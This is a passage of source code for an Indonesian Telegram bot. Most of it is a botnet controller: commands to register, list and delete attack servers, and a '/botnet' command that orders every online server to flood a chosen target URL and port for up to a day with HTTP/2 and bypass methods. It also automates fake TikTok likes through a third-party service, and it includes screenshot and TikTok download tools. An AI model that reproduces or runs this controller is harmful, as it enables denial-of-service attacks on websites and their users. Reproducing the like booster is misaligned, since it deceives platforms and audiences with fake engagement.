<blockquote>❌ GAGAL MENAMBAHKAN SERVER!</blockquote>
──────────────────────
🔗 URL: ${serverUrl}
🌐 HOST: ${hostname}
🔌 PORT: ${port}
🐛 ERROR: ${errorMsg}
──────────────────────
💡 <b>PENYEBAB:</b>
• Server offline
• Port tertutup
• Endpoint /repzapi gak ada
• Firewall ngeblock
──────────────────────
📌 Cek: curl ${serverUrl}/repzapi
乙 ㄚ 几 ㄖ 丂
      `,
      { parse_mode: "HTML" }
    );
  }
});
// ====== END ADD BOTNET SERVER ======

// ====== LIST BOTNET SERVERS ======
bot.command("listsrv", checkCmd("listsrv"), checkOwner, async (ctx) => {
  const botnetPath = path.join(__dirname, './database/botnet.json');
  
  if (!fs.existsSync(botnetPath)) {
    return ctx.reply("📂 *BELUM ADA SERVER BOTNET!*\n\nTambahkan dengan /addsrv", { parse_mode: 'Markdown' });
  }

  try {
    const fileContent = fs.readFileSync(botnetPath, 'utf8');
    const servers = JSON.parse(fileContent);

    if (servers.length === 0) {
      return ctx.reply("📂 *BELUM ADA SERVER BOTNET!*\n\nTambahkan dengan /addsrv", { parse_mode: 'Markdown' });
    }

    let text = `📋 *DAFTAR SERVER BOTNET*\n━━━━━━━━━━━━━━━━━━━━\n\n`;
    
    for (const s of servers) {
      const statusIcon = s.status === 'online' ? '🟢' : '🔴';
      text += `${statusIcon} **ID:** ${s.id}\n`;
      text += `🔗 URL: ${s.url}\n`;
      text += `🌐 Host: ${s.hostname}:${s.port}\n`;
      text += `📅 Added: ${new Date(s.addedAt).toLocaleString('id-ID')}\n`;
      text += `━━━━━━━━━━━━━━━━━━━━\n`;
    }

    text += `\n📊 *Total Server:* ${servers.length}`;
    text += `\n🔥 Gunakan: /delsrv [id] untuk hapus`;

    await ctx.reply(text, { parse_mode: 'Markdown' });

  } catch (err) {
    await ctx.reply(`❌ Gagal membaca database: ${err.message}`);
  }
});
// ====== END LIST BOTNET SERVERS ======

// ====== DELETE BOTNET SERVER ======
bot.command("delsrv", checkCmd("delsrv"), checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      `❌ *Format Salah!*\n\n` +
      `Example: \`/delsrv 1\`\n` +
      `Lihat daftar server dengan: \`/listsrv\``,
      { parse_mode: 'Markdown' }
    );
  }

  const idToDelete = parseInt(args[1]);
  if (isNaN(idToDelete)) {
    return ctx.reply("❌ *ID harus angka!*", { parse_mode: 'Markdown' });
  }

  const botnetPath = path.join(__dirname, './database/botnet.json');
  
  if (!fs.existsSync(botnetPath)) {
    return ctx.reply("📂 *BELUM ADA SERVER BOTNET!*", { parse_mode: 'Markdown' });
  }

  try {
    const fileContent = fs.readFileSync(botnetPath, 'utf8');
    let servers = JSON.parse(fileContent);

    const index = servers.findIndex(s => s.id === idToDelete);
    if (index === -1) {
      return ctx.reply(`❌ *SERVER ID ${idToDelete} TIDAK DITEMUKAN!*\n\nGunakan /listsrv untuk melihat daftar`, { parse_mode: 'Markdown' });
    }

    const deletedServer = servers[index];
    servers.splice(index, 1);
    fs.writeFileSync(botnetPath, JSON.stringify(servers, null, 2), 'utf8');

    await ctx.reply(
      `✅ *SERVER BOTNET DIHAPUS!*\n\n` +
      `🔗 ${deletedServer.url}\n` +
      `🆔 ID: ${deletedServer.id}\n` +
      `📦 Sisa Server: ${servers.length}`,
      { parse_mode: 'Markdown' }
    );

  } catch (err) {
    await ctx.reply(`❌ Gagal menghapus: ${err.message}`);
  }
});
// ====== END DELETE BOTNET SERVER ======

// ====== BOTNET ATTACK EXECUTOR ======
bot.command("botnet", checkCmd("botnet"), checkOwner, async (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.from.username ? `@${ctx.from.username}` : userId;
  const date = moment().tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss');

  // PARSE ARGUMEN
  const args = ctx.message.text.split(" ");
  if (args.length < 5) {
    return ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>❌ FORMAT SALAH GOBLOK!</blockquote>
──────────────────────
📌 <b>Gunakan:</b> /botnet [method] [target] [port] [duration]
📋 <b>Contoh:</b>
• /botnet h2priv https://target.com 443 120
• /botnet browser http://sasaran.com 443 60
• /botnet bypass http://sasaran.com 443 60
──────────────────────
💡 <b>METHODS:</b> h2-zangx, flood, h2vxi, h2xii
乙 ㄚ 几 ㄖ 丂
      `,
      parse_mode: "HTML"
    });
  }

  const method = args[1].toLowerCase();
  let target = args[2];
  const port = args[3];
  const duration = args[4];

  // VALIDASI TARGET
  if (!target.startsWith('http://') && !target.startsWith('https://')) {
    target = 'http://' + target;
  }

  // VALIDASI METHOD
  const validMethods = ["h2priv", "browser", "bypass"];
  if (!validMethods.includes(method)) {
    return ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>❌ METHOD TIDAK VALID!</blockquote>
──────────────────────
⚔️ METHOD: ${method}
📋 <b>AVAILABLE:</b> ${validMethods.join(', ')}
──────────────────────
乙 ㄚ 几 ㄖ 丂
      `,
      parse_mode: "HTML"
    });
  }

  // VALIDASI DURATION
  const durationNum = parseInt(duration);
  if (isNaN(durationNum) || durationNum < 1 || durationNum > 86400) {
    return ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>❌ DURATION TIDAK VALID!</blockquote>
──────────────────────
⏱️ INPUT: ${duration}
📌 HARUS 1 - 86400 DETIK
──────────────────────
乙 ㄚ 几 ㄖ 丂
      `,
      parse_mode: "HTML"
    });
  }

  // VALIDASI PORT
  const portNum = parseInt(port);
  if (isNaN(portNum) || portNum < 1 || portNum > 65535) {
    return ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>❌ PORT TIDAK VALID!</blockquote>
──────────────────────
🔌 INPUT: ${port}
📌 HARUS 1 - 65535
──────────────────────
乙 ㄚ 几 ㄖ 丂
      `,
      parse_mode: "HTML"
    });
  }

  // CEK FILE BOTNET
  const botnetPath = path.join(__dirname, './database/botnet.json');
  
  if (!fs.existsSync(botnetPath)) {
    return ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>❌ TIDAK ADA SERVER!</blockquote>
──────────────────────
📌 Gunakan: /addsrv http://ip:port
📋 Contoh: /addsrv http://178.128.120.92:2883
──────────────────────
乙 ㄚ 几 ㄖ 丂
      `,
      parse_mode: "HTML"
    });
  }

  try {
    const fileContent = fs.readFileSync(botnetPath, 'utf8');
    let botnetServers = JSON.parse(fileContent);
    
    let onlineServers = botnetServers.filter(server => server.status === "online");
    
    if (onlineServers.length === 0) {
      return ctx.replyWithPhoto(getRandomImage(), {
        caption: `
<blockquote>❌ SEMUA SERVER OFFLINE!</blockquote>
──────────────────────
📌 Cek: /listsrv
📌 Tambah: /addsrv
──────────────────────
乙 ㄚ 几 ㄖ 丂
        `,
        parse_mode: "HTML"
      });
    }

    // KIRIM PESAN AWAL
    const msg = await ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>🚀 BOTNET ATTACK INITIATED</blockquote>
──────────────────────
🎯 <b>TARGET:</b> ${target}
🔌 <b>PORT:</b> ${port}
⏱️ <b>DURATION:</b> ${duration}s
⚔️ <b>METHOD:</b> ${method.toUpperCase()}
🖥️ <b>SERVERS:</b> ${onlineServers.length} ONLINE
──────────────────────
⏳ Mengirim perintah ke semua server...
乙 ㄚ 几 ㄖ 丂
      `,
      parse_mode: "HTML"
    });

    let successCount = 0;
    let failedCount = 0;
    let serverResults = [];

    // LOOP SEMUA SERVER
    for (const server of onlineServers) {
      try {
        const attackUrl = `${server.url}/repzapi?target=${encodeURIComponent(target)}&port=${port}&time=${duration}&method=${method}&duration=${duration}&host=${encodeURIComponent(target)}&methods=${method}`;
        
        const response = await axios.get(attackUrl, {
          timeout: 5000,
          headers: {
            'User-Agent': 'X-ZeroAI/6.9',
            'Accept': 'application/json'
          }
        });
        
        if (response.status === 200 || response.status === 404) {
          successCount++;
          serverResults.push(`✅ ${server.hostname}:${server.port} - OK`);
        } else {
          failedCount++;
          serverResults.push(`❌ ${server.hostname}:${server.port} - HTTP ${response.status}`);
        }
      } catch (error) {
        failedCount++;
        serverResults.push(`❌ ${server.hostname}:${server.port} - ${error.code || 'ERROR'}`);
      }

      // UPDATE PROGRESS SETIAP 5 SERVER
      if ((successCount + failedCount) % 5 === 0 || (successCount + failedCount) === onlineServers.length) {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          msg.message_id,
          null,
          `
<blockquote>🚀 BOTNET ATTACK PROGRESS</blockquote>
──────────────────────
🎯 <b>TARGET:</b> ${target}
🔌 <b>PORT:</b> ${port}
⏱️ <b>DURATION:</b> ${duration}s
⚔️ <b>METHOD:</b> ${method.toUpperCase()}
──────────────────────
📊 <b>PROGRESS:</b> ${successCount + failedCount}/${onlineServers.length}
✅ SUCCESS: ${successCount}
❌ FAILED: ${failedCount}
──────────────────────
⏳ Mengirim perintah ke server...
乙 ㄚ 几 ㄖ 丂
          `,
          { parse_mode: "HTML" }
        );
      }
    }

    // TAMPILKAN HASIL AKHIR (10 server teratas)
    let resultSummary = serverResults.slice(0, 10).join('\n');
    if (serverResults.length > 10) {
      resultSummary += `\n... dan ${serverResults.length - 10} server lainnya`;
    }

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>✅ ATTACK SENT SUCCESSFULLY</blockquote>
──────────────────────
🎯 <b>TARGET:</b> ${target}
🔌 <b>PORT:</b> ${port}
⏱️ <b>DURATION:</b> ${duration}s
⚔️ <b>METHOD:</b> ${method.toUpperCase()}
──────────────────────
📊 <b>RESULTS:</b>
✅ SUCCESS: ${successCount} servers
❌ FAILED: ${failedCount} servers
📈 TOTAL: ${onlineServers.length} servers
──────────────────────
📋 <b>DETAIL (10 teratas):</b>
${resultSummary}
──────────────────────
🔥 Attack berjalan di background
⏳ Sisa waktu: ${duration} detik
乙 ㄚ 几 ㄖ 丂
      `,
      { parse_mode: "HTML" }
    );

    // KIRIM NOTIF RINGKASAN
    await ctx.reply(
      `✅ *BOTNET ATTACK SENT!*\n\n` +
      `🎯 Target: ${target}\n` +
      `⚔️ Method: ${method.toUpperCase()}\n` +
      `⏱️ Duration: ${duration}s\n` +
      `✅ Success: ${successCount}\n` +
      `❌ Failed: ${failedCount}`,
      { parse_mode: 'Markdown' }
    );

  } catch (error) {
    await ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>❌ ERROR GOBLOK!</blockquote>
──────────────────────
🐛 ${error.message}
──────────────────────
💡 Cek /listsrv dulu bangsat
乙 ㄚ 几 ㄖ 丂
      `,
      parse_mode: "HTML"
    });
  }
});
// ====== END BOTNET ATTACK ======

// ====== SYSTEM STATUS / PING ======
bot.command("ping", checkCmd("ping"), checkOwner, async (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.from.username ? `@${ctx.from.username}` : userId;
  const botStartTime = Date.now();

  // FUNGSI FORMAT BYTES
  function formatBytes(bytes) {
    const sizes = ["B", "KB", "MB", "GB", "TB"];
    if (bytes === 0) return "0 B";
    const i = Math.floor(Math.log(bytes) / Math.log(1024));
    return `${(bytes / Math.pow(1024, i)).toFixed(2)} ${sizes[i]}`;
  }

  // FUNGSI FORMAT UPTIME
  function formatUptime(ms) {
    const totalSeconds = Math.floor(ms / 1000);
    const h = Math.floor(totalSeconds / 3600);
    const m = Math.floor((totalSeconds % 3600) / 60);
    const s = totalSeconds % 60;
    return `${h}j ${m}m ${s}d`;
  }

  // FUNGSI BACA SWAP
  function getSwapInfo() {
    try {
      const memInfo = fs.readFileSync("/proc/meminfo", "utf8");
      const swapTotal = parseInt(memInfo.match(/SwapTotal:\s+(\d+)/)?.[1] || "0") * 1024;
      const swapFree = parseInt(memInfo.match(/SwapFree:\s+(\d+)/)?.[1] || "0") * 1024;
      const swapUsed = swapTotal - swapFree;

      if (swapTotal === 0) {
        try {
          const swapon = execSync("swapon --show --noheadings | awk '{print $3,$4}'", { encoding: "utf8" }).trim();
          if (swapon) {
            const [used, total] = swapon.split(" ");
            return {
              total: parseInt(total) * 1024,
              used: parseInt(used) * 1024,
              free: (parseInt(total) - parseInt(used)) * 1024,
            };
          }
        } catch (e) {}
      }

      return { total: swapTotal, used: swapUsed, free: swapFree };
    } catch (err) {
      return { total: 0, used: 0, free: 0 };
    }
  }

  // FUNGSI BACA SWAPFILE
  function getSwapFiles() {
    try {
      const output = execSync("swapon --show --noheadings | awk '{print $1,$2}'", { encoding: "utf8" }).trim();
      if (!output) return "Tidak ada swapfile aktif";
      return output.split("\n").map((line) => {
        const [file, type] = line.split(" ");
        return `${file} (${type})`;
      }).join("\n");
    } catch {
      return "Tidak bisa baca swapfile";
    }
  }

  // HITUNG PING
  const start = performance.now();
  const pingMsg = await ctx.reply("📡 Mengecek ping...");
  const ping = Math.round(performance.now() - start);

  // AMBIL DATA SISTEM
  const usedMemory = os.totalmem() - os.freemem();
  const uptime = formatUptime(process.uptime() * 1000);
  const cpuInfo = os.cpus();
  const cpuModel = cpuInfo && cpuInfo.length ? cpuInfo[0].model : "Tidak diketahui";
  const cpuUsage = os.loadavg()[0].toFixed(2);
  const ramUsage = formatBytes(usedMemory);
  const ramTotal = formatBytes(os.totalmem());

  const swap = getSwapInfo();
  const swapUsage = formatBytes(swap.used);
  const swapTotal = formatBytes(swap.total);
  const swapPercent = swap.total > 0 ? ((swap.used / swap.total) * 100).toFixed(1) : "0";
  const swapFiles = getSwapFiles();

  // HITUNG PLUGIN (index.js aja)
  const pluginCount = 1; // index.js

  // BUILD PESAN
  let result = `
<blockquote>
<b>🤖 STATUS ZYNOS BOT</b>
────────────────────
📡 <b>Ping:</b> <code>${ping}ms</code>
⏱️ <b>Runtime:</b> ${uptime}
🧠 <b>CPU:</b> ${cpuModel}
⚙️ <b>CPU Usage:</b> ${cpuUsage}%
🧮 <b>RAM:</b> ${ramUsage} / ${ramTotal}
`;

  if (swap.total > 0) {
    result += `💾 <b>SWAP:</b> ${swapUsage} / ${swapTotal} (${swapPercent}% used)
📁 <b>Swapfile:</b>
${swapFiles}
`;
  } else {
    result += `💾 <b>SWAP:</b> Tidak aktif / 0 GB
`;
  }

  result += `🧩 <b>Total Plugin:</b> ${pluginCount}
📌 <b>User:</b> ${username}
────────────────────
乙 ㄚ 几 ㄖ 丂
</blockquote>`;

  // EDIT PESAN DENGAN HASIL
  await ctx.telegram.editMessageText(
    ctx.chat.id,
    pingMsg.message_id,
    null,
    result,
    { parse_mode: "HTML" }
  );
});
// ====== END SYSTEM STATUS ======

// ====== TIKTOK LIKE BOOSTER ======
bot.command("likes", checkCmd("likes"), checkOwner, async (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.from.username ? `@${ctx.from.username}` : userId;
  const date = moment().tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss');

  // PARSE ARGUMEN
  const args = ctx.message.text.split(" ");
  if (args.length < 3) {
    return ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>❌ FORMAT SALAH GOBLOK!</blockquote>
──────────────────────
📌 <b>Gunakan:</b> /likes [url_tiktok] [jumlah]
📋 <b>Contoh:</b>
• /likes https://vt.tiktok.com/ZSxG2tLqL/ 50
• /likes https://www.tiktok.com/@user/video/123456 100
──────────────────────
💡 <b>MAX PER SESSION:</b> 20 likes
⏱️ <b>PROSES:</b> 5 menit
乙 ㄚ 几 ㄖ 丂
      `,
      parse_mode: "HTML"
    });
  }

  const tiktokUrl = args[1];
  const targetLikes = parseInt(args[2]);

  // VALIDASI URL
  if (!tiktokUrl.includes('tiktok.com')) {
    return ctx.reply("❌ *URL TIDAK VALID!*\n\nPastikan URL mengandung 'tiktok.com'", { parse_mode: 'Markdown' });
  }

  // VALIDASI JUMLAH
  if (isNaN(targetLikes) || targetLikes < 1 || targetLikes > 1000) {
    return ctx.reply("❌ *JUMLAH TIDAK VALID!*\n\nMasukkan angka 1 - 1000", { parse_mode: 'Markdown' });
  }

  // KIRIM PESAN AWAL
  const msg = await ctx.replyWithPhoto(getRandomImage(), {
    caption: `
<blockquote>🚀 TIKTOK LIKE BOOSTER</blockquote>
──────────────────────
🎯 <b>Target:</b> ${targetLikes} likes
📱 <b>Video:</b> ${tiktokUrl}
👤 <b>User:</b> ${username}
⏰ <b>Waktu:</b> ${date}
──────────────────────
⏳ Memproses request...
乙 ㄚ 几 ㄖ 丂
    `,
    parse_mode: "HTML"
  });

  try {
    const maxPerDevice = 20;
    const minPerDevice = 10;
    
    let remaining = targetLikes;
    const devices = [];
    
    // HITUNG SESSIONS
    while (remaining > 0) {
      if (remaining >= maxPerDevice) {
        devices.push(maxPerDevice);
        remaining -= maxPerDevice;
      } else if (remaining >= minPerDevice) {
        devices.push(remaining);
        remaining = 0;
      } else {
        if (devices.length > 0 && devices[devices.length - 1] < maxPerDevice) {
          devices[devices.length - 1] += remaining;
        } else {
          devices.push(remaining);
        }
        remaining = 0;
      }
    }

    // UPDATE PROGRESS
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>🚀 TIKTOK LIKE BOOSTER</blockquote>
──────────────────────
🎯 <b>Target:</b> ${targetLikes} likes
📱 <b>Video:</b> ${tiktokUrl}
👤 <b>User:</b> ${username}
──────────────────────
📊 <b>Sessions:</b> ${devices.length}
📋 <b>Distribution:</b> ${devices.join(' + ')}
──────────────────────
⏳ Mengirim request ke Tiksta...
乙 ㄚ 几 ㄖ 丂
      `,
      { parse_mode: "HTML" }
    );

    let successSessions = 0;
    let failedSessions = 0;
    let sessionDetails = [];

    // LOOP SEMUA SESSIONS
    for (let i = 0; i < devices.length; i++) {
      const qty = devices[i];
      
      try {
        // REQUEST PERTAMA (dapat token)
        const startData = {
          ns_action: 'freetool_start',
          'freetool[id]': 3,
          'freetool[token]': '',
          'freetool[process_item]': tiktokUrl,
          'freetool[quantity]': qty
        };

        const startRes = await axios.post('https://tiksta.com/action/', querystring.stringify(startData), {
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'X-Requested-With': 'XMLHttpRequest'
          },
          timeout: 10000
        });

        if (!startRes.data.statu) {
          const errorMsg = startRes.data.alert?.text || 'Unknown error';
          failedSessions++;
          sessionDetails.push(`❌ Session ${i + 1}: ${errorMsg}`);
          continue;
        }

        const token = startRes.data.freetool_process_token;

        // REQUEST KEDUA (kirim token)
        const confirmData = {
          ns_action: 'freetool_start',
          'freetool[id]': 3,
          'freetool[token]': token,
          'freetool[process_item]': tiktokUrl,
          'freetool[quantity]': qty
        };

        await axios.post('https://tiksta.com/action/', querystring.stringify(confirmData), {
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'X-Requested-With': 'XMLHttpRequest'
          },
          timeout: 10000
        });

        successSessions++;
        sessionDetails.push(`✅ Session ${i + 1}: ${qty} likes sent`);

        // UPDATE PROGRESS
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          msg.message_id,
          null,
          `
<blockquote>🚀 TIKTOK LIKE BOOSTER</blockquote>
──────────────────────
🎯 <b>Target:</b> ${targetLikes} likes
📱 <b>Video:</b> ${tiktokUrl}
👤 <b>User:</b> ${username}
──────────────────────
📊 <b>Progress:</b> ${i + 1}/${devices.length}
✅ Success: ${successSessions}
❌ Failed: ${failedSessions}
──────────────────────
⏳ Mengirim session ${i + 1}...
乙 ㄚ 几 ㄖ 丂
          `,
          { parse_mode: "HTML" }
        );

      } catch (err) {
        failedSessions++;
        sessionDetails.push(`❌ Session ${i + 1}: ${err.message}`);
      }

      // DELAY BIAR GAK KENA RATE LIMIT
      await sleep(1000);
    }

    // TAMPILKAN HASIL
    let detailSummary = sessionDetails.slice(0, 10).join('\n');
    if (sessionDetails.length > 10) {
      detailSummary += `\n... dan ${sessionDetails.length - 10} session lainnya`;
    }

    const finalMsg = `
<blockquote>✅ LIKE BOOST COMPLETE</blockquote>
──────────────────────
🎯 <b>Target:</b> ${targetLikes} likes
📱 <b>Video:</b> ${tiktokUrl}
👤 <b>User:</b> ${username}
⏰ <b>Waktu:</b> ${date}
──────────────────────
📊 <b>RESULTS:</b>
✅ Success: ${successSessions} sessions
❌ Failed: ${failedSessions} sessions
📈 Total: ${devices.length} sessions
──────────────────────
📋 <b>DETAIL (10 teratas):</b>
${detailSummary}
──────────────────────
⏱️ Likes akan masuk dalam 5 menit
乙 ㄚ 几 ㄖ 丂
    `;

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      finalMsg,
      { parse_mode: "HTML" }
    );

    // KIRIM NOTIF
    await ctx.reply(
      `✅ *TIKTOK LIKE BOOST SENT!*\n\n` +
      `🎯 Target: ${targetLikes} likes\n` +
      `✅ Success: ${successSessions}\n` +
      `❌ Failed: ${failedSessions}\n` +
      `⏱️ Proses: 5 menit`,
      { parse_mode: 'Markdown' }
    );

  } catch (error) {
    console.error('[LIKES] Error:', error.message);
    
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>❌ ERROR LIKES BOOSTER</blockquote>
──────────────────────
🎯 <b>Target:</b> ${targetLikes} likes
📱 <b>Video:</b> ${tiktokUrl}
──────────────────────
🐛 ERROR: ${error.message}
──────────────────────
💡 Coba lagi nanti bangsat
乙 ㄚ 几 ㄖ 丂
      `,
      { parse_mode: "HTML" }
    );
  }
});
// ====== END TIKTOK LIKE BOOSTER ======

// ====== SCREENSHOT WEBSITE WITH BUTTON (BERWARNA) ======
bot.command("ssweb", checkCmd("ssweb"), async (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.from.username ? `@${ctx.from.username}` : userId;
  const date = moment().tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss');

  // PARSE ARGUMEN
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>❌ FORMAT SALAH GOBLOK!</blockquote>
──────────────────────
📌 <b>Gunakan:</b> /ssweb [url]
📋 <b>Contoh:</b>
• /ssweb https://google.com
• /ssweb https://github.com
──────────────────────
📱 <b>Mode:</b> Pilih lewat button
💡 <b>Supported:</b> Semua website
乙 ㄚ 几 ㄖ 丂
      `,
      parse_mode: "HTML"
    });
  }

  let targetUrl = args[1];
  
  // VALIDASI URL
  if (!targetUrl.startsWith('http://') && !targetUrl.startsWith('https://')) {
    targetUrl = 'https://' + targetUrl;
  }

  // KIRIM PESAN DENGAN BUTTON BERWARNA
  await ctx.replyWithPhoto(getRandomImage(), {
    caption: `
<blockquote>📸 SCREENSHOT WEBSITE</blockquote>
──────────────────────
🌐 <b>URL:</b> ${targetUrl}
👤 <b>User:</b> ${username}
⏰ <b>Waktu:</b> ${date}
──────────────────────
📱 <b>Pilih Mode Screenshot:</b>
乙 ㄚ 几 ㄖ 丂
    `,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { 
            text: "📱 Mobile", 
            callback_data: `ssweb_${targetUrl}_mobile`,
            style: "primary" 
          },
          { 
            text: "💻 Desktop", 
            callback_data: `ssweb_${targetUrl}_desktop`,
            style: "success" 
          }
        ],
        [
          { 
            text: "📟 Tablet", 
            callback_data: `ssweb_${targetUrl}_tablet`,
            style: "danger" 
          }
        ]
      ]
    }
  });
});

// ====== HANDLER BUTTON SSWEB ======
bot.action(/^ssweb_(.+)_(mobile|desktop|tablet)$/, async (ctx) => {
  const callbackData = ctx.match[0];
  const parts = callbackData.split('_');
  const mode = parts.pop();
  const url = parts.slice(1).join('_');
  
  const userId = ctx.from.id.toString();
  const username = ctx.from.username ? `@${ctx.from.username}` : userId;
  const date = moment().tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss');

  // KIRIM PESAN PROGRESS
  const msg = await ctx.replyWithPhoto(getRandomImage(), {
    caption: `
<blockquote>📸 SCREENSHOT WEBSITE</blockquote>
──────────────────────
🌐 <b>URL:</b> ${url}
📱 <b>Mode:</b> ${mode.toUpperCase()}
👤 <b>User:</b> ${username}
⏰ <b>Waktu:</b> ${date}
──────────────────────
⏳ Mengambil screenshot...
乙 ㄚ 几 ㄖ 丂
    `,
    parse_mode: "HTML"
  });

  try {
    const encodedUrl = encodeURIComponent(url);
    const apiUrl = `https://bintangapi.my.id/api/tools/ssweb?url=${encodedUrl}&mode=${mode}`;

    // AMBIL SCREENSHOT
    const response = await axios.get(apiUrl, {
      timeout: 30000,
      responseType: 'arraybuffer'
    });

    // CEK APAKAH RESPONSE BERHASIL
    if (response.status === 200) {
      const imageBuffer = Buffer.from(response.data, 'binary');
      
      // HAPUS PESAN PROGRESS
      await ctx.deleteMessage(msg.message_id);
      
      // KIRIM FOTO
      await ctx.replyWithPhoto(
        { source: imageBuffer },
        {
          caption: `
<blockquote>✅ SCREENSHOT SUCCESS</blockquote>
──────────────────────
🌐 <b>URL:</b> ${url}
📱 <b>Mode:</b> ${mode.toUpperCase()}
👤 <b>User:</b> ${username}
⏰ <b>Waktu:</b> ${date}
──────────────────────
乙 ㄚ 几 ㄖ 丂
          `,
          parse_mode: "HTML"
        }
      );

    } else {
      throw new Error(`HTTP ${response.status}`);
    }

  } catch (error) {
    console.error('[SSWEB] Error:', error.message);
    
    let errorMsg = error.message;
    if (error.code === 'ECONNABORTED') {
      errorMsg = 'TIMEOUT - Server terlalu lama merespon';
    } else if (error.response?.status === 404) {
      errorMsg = 'URL tidak ditemukan atau invalid';
    } else if (error.response?.status === 500) {
      errorMsg = 'Server API error';
    }

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>❌ SCREENSHOT FAILED</blockquote>
──────────────────────
🌐 <b>URL:</b> ${url}
📱 <b>Mode:</b> ${mode.toUpperCase()}
──────────────────────
🐛 ERROR: ${errorMsg}
──────────────────────
💡 <b>PENYEBAB:</b>
• URL tidak valid
• Website down
• Server API error
• Timeout (30 detik)
──────────────────────
📌 Coba: /ssweb https://google.com
乙 ㄚ 几 ㄖ 丂
      `,
      { parse_mode: "HTML" }
    );
  }
});
// ====== END SCREENSHOT WEBSITE ======

// ====== TIKTOK DOWNLOADER ======
bot.command("ttdl", checkCmd("ttdl"), async (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.from.username ? `@${ctx.from.username}` : userId;
  const date = moment().tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss');

  // PARSE ARGUMEN
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>❌ FORMAT SALAH GOBLOK!</blockquote>
──────────────────────
📌 <b>Gunakan:</b> /ttdl [url_tiktok]
📋 <b>Contoh:</b>
• /ttdl https://vt.tiktok.com/ZSxWXd2UP/
• /ttdl https://www.tiktok.com/@user/video/123456789
──────────────────────
💡 <b>Support:</b> Video & Audio
📱 <b>Auto detect:</b> Format terbaik
乙 ㄚ 几 ㄖ 丂
      `,
      parse_mode: "HTML"
    });
  }

  let targetUrl = args[1];
  
  // VALIDASI URL
  if (!targetUrl.includes('tiktok.com')) {
    return ctx.reply("❌ *URL TIDAK VALID!*\n\nPastikan URL mengandung 'tiktok.com'", { parse_mode: 'Markdown' });
  }

  // KIRIM PESAN AWAL
  const msg = await ctx.replyWithPhoto(getRandomImage(), {
    caption: `
<blockquote>📥 TIKTOK DOWNLOADER</blockquote>
──────────────────────
🌐 <b>URL:</b> ${targetUrl}
👤 <b>User:</b> ${username}
⏰ <b>Waktu:</b> ${date}
──────────────────────
⏳ Mengambil data video...
乙 ㄚ 几 ㄖ 丂
    `,
    parse_mode: "HTML"
  });

  try {
    const encodedUrl = encodeURIComponent(targetUrl);
    const apiUrl = `https://bintangapi.my.id/api/downloader/tiktok?url=${encodedUrl}`;

    // AMBIL DATA DARI API
    const response = await axios.get(apiUrl, {
      timeout: 20000,
      headers: {
        'Accept': 'application/json'
      }
    });

    const data = response.data;

    // CEK APAKAH RESPONSE BERHASIL
    if (data.status !== 200 || !data.data) {
      throw new Error(data.message || 'Gagal mengambil data');
    }

    const videoData = data.data;
    const title = videoData.title || 'TikTok Video';
    const duration = videoData.duration || 'N/A';
    const author = videoData.author?.unique_id || 'Unknown';
    const views = videoData.views || 0;
    const likes = videoData.likes || 0;
    const comments = videoData.comments || 0;
    const shares = videoData.shares || 0;

    // AMBIL LINK
    const videoHD = videoData.play || videoData.play_hd || videoData.wmplay || null;
    const videoNoWatermark = videoData.wmplay || videoData.play || null;
    const audio = videoData.music || null;
    const thumbnail = videoData.cover || null;

    // HAPUS PESAN PROGRESS
    await ctx.deleteMessage(msg.message_id);

    // KIRIM THUMBNAIL + INFO
    if (thumbnail) {
      await ctx.replyWithPhoto(thumbnail, {
        caption: `
<blockquote>🎬 TIKTOK VIDEO FOUND</blockquote>
──────────────────────
📝 <b>Title:</b> ${title.substring(0, 50)}${title.length > 50 ? '...' : ''}
👤 <b>Author:</b> @${author}
⏱️ <b>Duration:</b> ${duration} detik
👁️ <b>Views:</b> ${views.toLocaleString()}
❤️ <b>Likes:</b> ${likes.toLocaleString()}
💬 <b>Comments:</b> ${comments.toLocaleString()}
🔗 <b>Shares:</b> ${shares.toLocaleString()}
──────────────────────
📥 <b>Pilih kualitas download:</b>
乙 ㄚ 几 ㄖ 丂
        `,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              { 
                text: "🎥 HD (With Watermark)", 
                callback_data: `ttdl_${encodedUrl}_hd`,
                style: "primary" 
              },
              { 
                text: "🎬 No Watermark", 
                callback_data: `ttdl_${encodedUrl}_nowm`,
                style: "success" 
              }
            ],
            [
              { 
                text: "🎵 Audio Only", 
